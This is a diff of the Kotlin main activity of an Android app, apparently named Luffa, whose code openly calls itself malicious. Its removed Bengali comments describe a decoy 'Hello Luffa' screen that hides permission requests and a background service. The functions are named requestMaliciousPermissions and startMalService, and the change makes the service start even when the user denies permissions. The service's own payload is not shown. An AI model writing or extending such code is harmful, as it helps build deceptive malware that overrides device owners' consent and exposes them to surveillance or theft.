@@ -11,17 +11,16 @@ import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import luffa.R
 
-
 class MainActivity : AppCompatActivity() {
 
     private val REQUEST_PERM_CODE = 1001
+    private lateinit var serviceIntent: Intent
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // ডিকয় UI তে হ্যালো লুফা দেখাচ্ছে
-        // ব্যাকগ্রাউন্ডে পারমিশন চাইব আর সার্ভিস স্টার্ট করব
+        serviceIntent = Intent(this, MyService::class.java)
         requestMaliciousPermissions()
     }
 
@@ -36,7 +35,6 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.FOREGROUND_SERVICE
         )
 
-        // অ্যান্ড্রয়েড ৬+ এর জন্য চেক
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val ungranted = perms.filter {
                 ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
@@ -47,7 +45,7 @@ class MainActivity : AppCompatActivity() {
                 startMalService()
             }
         } else {
-            startMalService() // পুরোনো ওএস এ পারমিশন অটো
+            startMalService()
         }
     }
 
@@ -58,23 +56,14 @@ class MainActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == REQUEST_PERM_CODE) {
-            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                startMalService()
-            } else {
+            startMalService()
+            if (!grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                 Toast.makeText(this, "Allow all permissions for app to work!", Toast.LENGTH_LONG).show()
-                // এখনও সার্ভিস চালু করব — কিছু পারমিশন না থাকলেও চলবে
-                startMalService()
             }
         }
     }
 
     private fun startMalService() {
-        
-        
-      val intent = Intent(this, MyService::class.java) // ✅ সঠিক নাম
-startService(intent) // বা যেভাবেই সার্ভিসটি কল করা হয়েছে
-  
-       
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent)
         } else {
